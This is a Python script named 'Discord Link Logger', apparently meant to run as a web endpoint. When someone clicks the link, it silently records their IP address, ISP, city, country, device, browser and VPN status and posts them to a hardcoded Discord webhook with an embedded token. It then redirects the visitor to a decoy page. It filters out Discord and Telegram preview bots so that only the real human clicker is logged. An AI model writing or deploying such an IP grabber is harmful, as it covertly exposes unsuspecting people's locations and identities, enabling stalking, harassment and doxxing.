from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, json

__app__ = "Discord Link Logger"
__description__ = "A link logger that redirects to a specified page"
__version__ = "v2.0"
__author__ = ""

config = {
    "webhook": "https://discord.com/api/webhooks/1360741270804365352/c8BRSpDn16HrjtJVTKuHuartuGVlvadouHi5DSMGbxKOQ7rmTP2X-fwrfTpgrLrRh6-F",
    "username": "Link Logger",
    "color": 0x000000,  # Black color
    
    # Redirection settings
    "redirect": {
        "enabled": True,
        "page": "https://snare-delta.vercel.app/"
    },
    
    # Detection settings
    "vpnCheck": 1,
    "antiBot": 1,
    "linkAlerts": True
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "embeds": [{
            "title": "Logger Error",
            "color": config["color"],
            "description": f"```\n{error}\n```"
        }]
    })

def get_discord_info(request):
    try:
        # Check for Discord-specific headers
        cf_ray = request.headers.get('CF-RAY')
        if cf_ray and 'discord' in cf_ray.lower():
            return {
                "is_discord": True,
                "user_agent": request.headers.get('User-Agent'),
                "referer": request.headers.get('Referer')
            }
        return {"is_discord": False}
    except:
        return {"is_discord": False}

def makeReport(ip, useragent=None, discord_info=None):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "embeds": [{
                    "title": "Bot Detected",
                    "color": config["color"],
                    "description": f"Bot activity detected\n\n**IP:** `{ip}`\n**Platform:** `{bot}`"
                }]
            })
        return

    # Get IP information
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    
    # Prepare the embed
    embed = {
        "username": config["username"],
        "embeds": [{
            "title": "Link Accessed",
            "color": config["color"],
            "description": "",
            "fields": []
        }]
    }

    # Add IP information
    embed["embeds"][0]["fields"].extend([
        {"name": "IP Address", "value": f"`{ip}`", "inline": True},
        {"name": "ISP", "value": f"`{info.get('isp', 'Unknown')}`", "inline": True},
        {"name": "Location", "value": f"`{info.get('city', 'Unknown')}, {info.get('country', 'Unknown')}`", "inline": True},
        {"name": "Device", "value": f"`{httpagentparser.simple_detect(useragent)[0] if useragent else 'Unknown'}`", "inline": True},
        {"name": "Browser", "value": f"`{httpagentparser.simple_detect(useragent)[1] if useragent else 'Unknown'}`", "inline": True},
        {"name": "VPN/Proxy", "value": f"`{'Yes' if info.get('proxy') else 'No'}`", "inline": True}
    ])

    # Add Discord info if available
    if discord_info and discord_info.get("is_discord"):
        embed["embeds"][0]["description"] = "**Accessed from Discord**"
        embed["embeds"][0]["fields"].append(
            {"name": "User Agent", "value": f"```\n{discord_info.get('user_agent', 'Unknown')}\n```", "inline": False}
        )
    else:
        embed["embeds"][0]["description"] = "**Link Accessed**"

    requests.post(config["webhook"], json=embed)
    return info

class LinkLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            # Get client info
            ip = self.headers.get('x-forwarded-for')
            useragent = self.headers.get('user-agent')
            
            # Check for Discord access
            discord_info = get_discord_info(self)
            
            # Make the report
            makeReport(ip, useragent, discord_info)
            
            # Redirect to the target page
            self.send_response(302)
            self.send_header('Location', config["redirect"]["page"])
            self.end_headers()
            
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            reportError(traceback.format_exc())

    do_GET = handleRequest
    do_POST = handleRequest

handler = app = LinkLoggerAPI
